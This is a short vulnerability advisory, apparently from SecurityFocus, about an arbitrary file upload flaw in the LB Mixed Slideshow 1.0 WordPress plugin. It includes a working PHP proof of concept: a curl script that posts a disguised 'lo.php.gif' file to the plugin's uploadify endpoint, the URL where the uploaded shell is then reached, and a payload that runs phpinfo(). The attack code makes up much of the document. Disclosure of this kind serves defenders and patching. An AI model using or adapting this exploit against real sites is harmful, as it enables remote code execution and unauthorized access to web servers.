source: http://www.securityfocus.com/bid/54057/info

LB Mixed Slideshow plugin for WordPress is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this vulnerability to upload arbitrary code and run it in the context of the web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

LB Mixed Slideshow 1.0 is vulnerable; other versions may also be affected. 

PostShell.php
<?php

$uploadfile="lo.php.gif";
 
$ch = curl_init("http://www.exemple.com/wordpress/wp-content/plugins/lb-mixed-slideshow/libs/uploadify/upload.php?element_name=images&gid=1");
curl_setopt($ch, CURLOPT_POST, true);   
curl_setopt($ch, CURLOPT_POSTFIELDS, array('images'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access : http://www.example.com/wordpress/wp-content/plugins/lb-mixed-slideshow/gallery/1/lo.php.gif

lo.php.gif
<?php
phpinfo();
?> 
